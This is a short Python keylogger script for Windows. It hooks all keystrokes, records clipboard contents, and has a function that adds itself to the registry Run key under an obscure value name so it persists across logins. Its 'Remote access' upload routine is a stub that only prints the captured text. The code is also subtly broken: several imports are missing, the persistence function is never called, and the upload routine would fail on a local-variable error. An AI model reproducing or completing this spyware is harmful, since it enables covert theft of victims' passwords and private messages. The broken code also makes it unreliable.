import keyboard
import pyperclip

queue = ""
last_copied = ""
i = 0

# http://opensecurity.in/xenotix-python-keylogger-for-windows/
def add_startup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER, key, 0, KEY_ALL_ACCESS)

    SetValueEx(key2change, "prueba_cvxz", 0, REG_SZ, new_file_path)


# Remote access
def upload():
    print(queue)
    i = 0
    queue = ""


# Process keys
def process_event(e):
    global i, queue, last_copied
    i += 1
    if e.event_type == "down":
        if len(e.name) == 1:
            queue += e.name
        elif e.name == "space":
            queue += " "
        else:
            queue += "\n[%s]" % e.name

    if pyperclip.paste() != last_copied:
        queue += ' "%s" ' % pyperclip.paste()
        last_copied = pyperclip.paste()
        i += len(last_copied)

    if i > 100:
        upload()


def main():
    keyboard.hook(process_event)
    keyboard.wait()


if __name__ == '__main__':
    main()
